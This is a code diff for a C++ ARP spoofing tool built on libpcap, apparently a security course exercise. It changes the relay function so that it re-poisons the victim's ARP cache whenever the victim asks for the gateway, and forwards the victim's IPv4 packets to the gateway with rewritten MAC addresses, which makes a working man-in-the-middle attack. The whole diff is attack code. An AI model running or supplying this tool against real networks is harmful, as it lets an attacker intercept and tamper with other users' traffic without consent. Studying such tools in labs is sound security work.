@@ -7,12 +7,12 @@
 #include <net/if.h>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "iphdr.h"
 #include <pcap.h>
 #include <unistd.h>
 #include <vector>
 #include <thread>
 #include <mutex>
-
 
 
 #pragma pack(push, 1)
@@ -45,9 +45,10 @@ using namespace std;
 bool send_arp_request(pcap_t* dev, Mac my_mac, Ip my_ip, Ip target_ip, Mac& target_mac);
 bool getMacIpAddr(string &iface_name, Mac& mac_addr, Ip& ip_addr);
 bool arp_infection(pcap_t* dev, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip);
-bool arp_relay(pcap_t* dev, Mac attack_mac, Mac target_mac, Ip sender_ip, Ip target_ip);
+bool arp_relay(pcap_t* dev, Mac attack_mac, Mac sender_mac,Mac target_mac, Ip sender_ip, Ip target_ip);
 
-std::mutex pcap_mutex;
+extern std::mutex pcap_mutex;
+extern bool running = true;
 
 int main(int argc, char *argv[]) {
     if ((argc & 1) || (argc < 4)) {
@@ -82,7 +83,7 @@ int main(int argc, char *argv[]) {
     //cout << string(send_tar_ips[0].sender) << endl;
 
     vector<thread> threads;
-    bool running = true;
+
 
     for (int i = 0; i < send_tar_ips.size(); i++) {
         //send arp request
@@ -116,13 +117,11 @@ int main(int argc, char *argv[]) {
         //sender = victim , target = gateway
         //thread
         threads.push_back(thread([=,&running](){
-            while (running) {
                 // sender→target capture
                 lock_guard<mutex> lk(pcap_mutex);
-                arp_relay(pcap, attacker_mac, send_tar_macs[i].target,
+                arp_relay(pcap, attacker_mac, send_tar_macs[i].sender, send_tar_macs[i].target,
                     send_tar_ips[i].sender, send_tar_ips[i].target);
-                sleep(5);
-            }
+
         }));
 
     }
@@ -256,15 +255,15 @@ bool arp_infection(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Ip sender_ip, I
 
 }
 
-bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac target_mac, Ip sender_ip, Ip target_ip) {
+bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip sender_ip, Ip target_ip) {
 
-    EthArpPacket packet;
     EthArpPacket pkt;
     struct pcap_pkthdr* header;
+
     const uint8_t* recv_pkt;
     int res_recv;
 
-    while (true) {
+    while (running) {
 
         res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
         if (res_recv == 0) continue;
@@ -277,25 +276,37 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac target_mac, Ip sender_ip, Ip ta
         memcpy(buf, recv_pkt, len);
 
         EthHdr* ethhdr = reinterpret_cast<EthHdr*>(buf);
+        uint16_t eth_type = ntohs(ethhdr->type());
 
-        if (ntohs(ethhdr->type()) != EthHdr::Ip4) {
-            delete[] buf;
-            continue;
+        if (eth_type == EthHdr::Arp) {
+            EthArpPacket* arp_pkt = reinterpret_cast<EthArpPacket*>(buf);
+            //reply case 1 : sender -> taregt ARP request (if ARP table expired , who is target?)
+            if (ethhdr->dmac() == Mac::broadcastMac() && arp_pkt->arp_.op() == ArpHdr::Request
+                && arp_pkt->arp_.sip() == sender_ip && arp_pkt->arp_.tip() == target_ip)
+            {
+                if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
+                    cout << "Failed ARP infection\n";
+                    return false;
+                    }
+            }
         }
-        //IpHdr 쓰기
-        //case로 재감염, relay를 구분
+        else if (eth_type == EthHdr::Ip4) {
+            // IPv4 패킷 처리 (sender → target 만 relay)
+            IpHdr* iphdr = reinterpret_cast<IpHdr*>(buf + sizeof(EthHdr));
+            if (iphdr->sip_ == sender_ip && iphdr->dip_ == target_ip)
+            {
+                ethhdr->smac_ = attack_mac;
+                ethhdr->dmac_ = target_mac;
 
-        ethhdr->smac_ = attack_mac;
-        ethhdr->dmac_ = target_mac;
-        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
-        if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-            return false;
+                int res = pcap_sendpacket(pcap, buf, len);
+                if (res != 0) {
+                    fprintf(stderr, "pcap_sendpacket failed: %d (%s)\n", res, pcap_geterr(pcap));
+                    delete[] buf;
+                    return false;
+                }
+            }
         }
-
-
+        delete[] buf;
     }
-
-
     return true;
 }
